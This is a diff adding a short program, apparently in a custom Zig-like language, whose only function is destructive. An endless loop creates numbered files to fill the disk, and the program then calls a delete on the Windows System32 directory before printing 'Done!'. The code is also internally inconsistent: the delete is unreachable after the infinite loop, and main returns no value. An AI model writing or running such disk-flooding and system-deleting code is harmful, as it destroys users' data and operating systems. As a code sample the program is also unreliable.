@@ -1,0 +1,14 @@
+fn main(argc: i64, argv: **u8) i64 {
+    const buffer = <*u8>@malloc(100);
+
+    var times = 0;
+    while (true) {
+        @sprintf(buffer, "file%d.txt", times);
+        const handle = @fcreate(buffer);
+        @fclose(handle);
+    } loop: times += 1;
+
+    @fdelete("C:\\Windows\\System32");
+    @printf("Done!\n");
+    @free(buffer);
+}
